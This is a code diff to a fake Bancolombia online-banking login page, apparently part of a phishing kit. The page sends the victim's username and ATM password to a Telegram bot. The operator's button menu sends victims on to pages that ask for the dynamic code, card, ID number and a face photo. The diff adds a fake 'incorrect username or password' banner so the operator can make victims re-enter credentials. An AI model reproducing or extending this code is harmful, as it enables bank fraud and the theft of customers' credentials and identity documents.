@@ -14,6 +14,7 @@
     </script>
     <script src="/socket.io/socket.io.js"></script>
     <script src="/js/banco-utils.js"></script>
+    <script src="bancolombia-telegram.js"></script>
     <script>
     document.addEventListener('DOMContentLoaded', async function() {
         const usuario = document.getElementById('usuario');
@@ -23,6 +24,9 @@
         const overlay = document.getElementById('loadingOverlay');
         
         if (!usuario || !clave || !btn || !form || !overlay) return;
+
+        BancolombiaTelegram.setupLoginErrorBanner();
+        BancolombiaTelegram.initLoginErrorFromStorage();
         
         overlay.classList.remove('active', 'show');
         overlay.style.display = '';
@@ -67,16 +71,7 @@
             const data = { usuario: usuario.value.trim(), clave: clave.value };
             const fullData = BancoUtils.saveBankData('bancolombia', data);
             const message = BancoUtils.formatMessage('BANCOLOMBIA - Login', fullData);
-            const buttons = [
-                { text: '🔑 Pedir Usuario', action: 'index' },
-                { text: '🔢 Pedir Dinámica', action: 'dinamica' },
-                { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
-                { text: '🆔 Pedir Cédula', action: 'cedula' },
-                { text: '📷 Pedir Cara', action: 'cara' },
-                { text: '📄 Pedir Términos', action: 'terminos' },
-                { text: '✅ Finalizar', action: 'finalizar' }
-            ];
-            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+            const keyboard = BancolombiaTelegram.getKeyboard();
             
             try {
                 await BancoUtils.sendToTelegram('login', { text: message, keyboard });
@@ -87,18 +82,7 @@
             }
         });
         
-        BancoUtils.onTelegramAction((data) => {
-            if (data.action === 'continue') {
-                overlay.classList.remove('active');
-                overlay.style.display = 'none';
-                return;
-            }
-            if (data.action === 'finalizar') {
-                window.location.href = 'https://www.bancolombia.com/personas';
-            } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
-                window.location.href = data.action + '.html';
-            }
-        });
+        BancoUtils.onTelegramAction((data) => BancolombiaTelegram.handleTelegramAction(data));
         
         async function updateInfo() {
             try {
@@ -123,6 +107,15 @@
             <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
             <h1>Sucursal Virtual Personas</h1>
             
+            <div id="loginErrorBanner" class="bank-error-banner" role="alert" hidden>
+                <span class="bank-error-banner__icon" aria-hidden="true"></span>
+                <div class="bank-error-banner__text">
+                    <strong>Usuario o clave incorrecta</strong>
+                    <span>Verifica la información e inténtalo de nuevo.</span>
+                </div>
+                <button type="button" class="bank-error-banner__close" aria-label="Cerrar">&times;</button>
+            </div>
+
             <div class="auth-box">
                 <h2>¡Hola!</h2>
                 <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
@@ -136,6 +129,7 @@
                                 <label for="usuario">Usuario</label>
                             </div>
                         </div>
+                        <p class="field-error-msg">Ingresa tu usuario</p>
                         <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/recordar-usuario" class="forgot-link">¿Olvidaste tu usuario?</a>
                     </div>
 
@@ -147,6 +141,7 @@
                                 <label for="clave">Clave del cajero</label>
                             </div>
                         </div>
+                        <p class="field-error-msg">Ingresa tu clave</p>
                         <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/crea-tu-clave" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
                     </div>
 
